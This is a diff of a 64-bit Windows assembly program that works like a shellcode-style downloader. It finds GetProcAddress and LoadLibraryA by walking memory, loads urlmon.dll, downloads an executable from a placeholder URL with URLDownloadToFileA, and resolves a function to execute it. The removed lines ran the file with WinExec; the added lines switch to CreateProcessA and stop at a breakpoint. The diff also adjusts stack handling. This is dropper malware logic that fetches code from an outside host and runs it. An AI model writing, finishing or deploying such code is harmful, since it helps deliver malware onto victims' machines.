@@ -1,4 +1,5 @@
 [bits 64]
+global main
 
 O_CREAT EQU   0x0100
 O_RDWR EQU    0x0002
@@ -13,9 +14,9 @@ O_APPEND EQU  0x0008
 ; r15 = Data section
 section .text
   main:
-    sub rsp, 6*8
     push rbp
-    mov rbp ,rsp
+    mov rbp, rsp
+    sub rsp, 0x40             ; Make space for functions calls/local variables
     call init
     sub rax, $
     mov r15, rax            ; $rip
@@ -30,15 +31,14 @@ section .text
     mov r8, 15
     call getFunction
     mov r12, [r12d + 0x30]
-    push r12
+    push r12		  ; kernel32.dll
+    sub rsp, 0x48           ; Make space for functions call
     mov r13, rax          ; r13 = GetProcAddress
     mov rcx, r12
     mov rdx, r15
     add rdx, loadLibrary
     call rax              ; Get LoadLibraryA
     mov r14, rax          ; r14 = LoadLibraryA
-
-
     mov rcx, r15
     add rcx, dll1
     call r14              ; Load urlmon.dll
@@ -46,15 +46,24 @@ section .text
     mov rdx, r15
     add rdx, downloadF
     call r13              ; Get URLDownloadToFileA
-    xor rcx, rcx
+    ; xor r9, r9
+    ; mov rbp, rax
+    mov rcx, 0x0
     mov rdx, r15
     add rdx, url
     mov r8, r15
     add r8, filename
     xor r9, r9
-    push r9
+    push 0x0              ; 5th parameter is 64 bits
+    push 0x0
+    push 0x0
+    push 0x0
+    push 0x0
+    push 0x0
+    push 0x0
+    push 0x0
     call rax              ; Download &url to &filename
-    add rsp, 8            ; Clear parameters from stack
+    add rsp, 64            ; Clear parameters from stack
     ; TODO Check return value == S_OK
     mov rcx, r15
     add rcx, dll2
@@ -91,16 +100,12 @@ section .text
       mov rbx, rax
       jmp downloadCheck
       done:
-        pop rcx                 ; kernel32.dll
+	add rsp, 0x48		; Local variables
+	pop rcx
         mov rdx, r15
-        add rdx, execF          ; WinExec
+        add rdx, execF          ; CreateProcessA
         call r13
-        mov rcx, r15
-        add rcx, filename
-        mov rdx, 0
-        call rax
-        jmp end
-    
+        int3
   
   getFunction:
     push rbp
@@ -191,5 +196,5 @@ section .data
   sleepF db "Sleep", 0
   url db "https://UrlToAFile.com", 0
   filename db "./filename.exe", 0
-  execF db "WinExec", 0
+  execF db "CreateProcessA", 0
   end
